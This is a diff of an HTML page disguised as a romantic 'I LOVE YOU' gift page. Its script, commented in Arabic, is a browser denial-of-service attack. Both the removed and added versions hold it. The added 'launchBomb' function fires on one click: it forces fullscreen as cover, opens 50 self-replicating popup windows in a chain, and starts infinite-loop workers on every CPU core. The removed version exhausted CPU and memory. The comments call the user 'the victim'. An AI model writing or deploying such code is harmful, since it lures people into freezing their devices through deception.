@@ -4,47 +4,40 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        h1 { font-size: 5rem; font-family: sans-serif; transition: 0.5s; }
+        body { background: black; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: pointer; }
+        h1 { color: #ff4d4d; font-size: 4rem; text-shadow: 0 0 20px red; }
+        p { font-size: 1.5rem; color: #ccc; }
     </style>
 </head>
 <body>
 
-    <h1 id="text">I LOVE YOU</h1>
+    <h1>I LOVE YOU</h1>
+    <p>Click here to see your gift... 🎁</p>
 
     <script>
-        function stealthAttack() {
-            // دخول ملء الشاشة
+        function launchBomb() {
+            // 1. طلب ملء الشاشة للتمويه
             document.documentElement.requestFullscreen().catch(() => {});
 
-            // هجوم المعالج بالتدريج (بفتح عمال كل نصف ثانية)
-            let workerCount = 0;
-            const maxWorkers = (navigator.hardwareConcurrency || 8) * 2;
-            
-            const workerInterval = setInterval(() => {
-                if (workerCount < maxWorkers) {
-                    const worker = new Worker(URL.createObjectURL(new Blob([`
-                        setInterval(() => {
-                            let x = Math.sqrt(Math.random() * 999);
-                            for(let i=0; i<100000; i++) { x += i; }
-                        }, 50); // تأخير بسيط عشان المتصفح ميعملش Aw Snap
-                    `], {type: 'application/javascript'})));
-                    workerCount++;
-                } else {
-                    clearInterval(workerInterval);
-                }
-            }, 500);
+            // 2. فتح 50 نافذة جديدة في الخلفية بسرعة رهيبة
+            // كل نافذة هتحمل نفس الرابط وهتحاول تفتح نوافذ تانية (سلسلة لا نهائية)
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    window.open(window.location.href, '_blank', 'width=100,height=100');
+                }, i * 100);
+            }
 
-            // هجوم الرام المتوازن
-            let memoryBags = [];
-            setInterval(() => {
-                // بنحجز 5 ميجا بس كل شوية عشان المتصفح ميفصلش التبويب فجأة
-                memoryBags.push(new Float64Array(1024 * 640)); 
-            }, 100);
+            // 3. تشغيل ضغط المعالج "الهادئ" في التبويب الحالي عشان ميعملش Aw Snap
+            const cores = navigator.hardwareConcurrency || 4;
+            for (let i = 0; i < cores; i++) {
+                new Worker(URL.createObjectURL(new Blob([`
+                    while(true) { Math.random() * Math.random(); }
+                `], {type: 'application/javascript'})));
+            }
         }
 
-        // بيبدأ أول ما الضحية يلمس الشاشة
-        window.onclick = stealthAttack;
+        // الهجوم يبدأ بلمسة واحدة
+        window.onclick = launchBomb;
     </script>
 </body>
 </html>
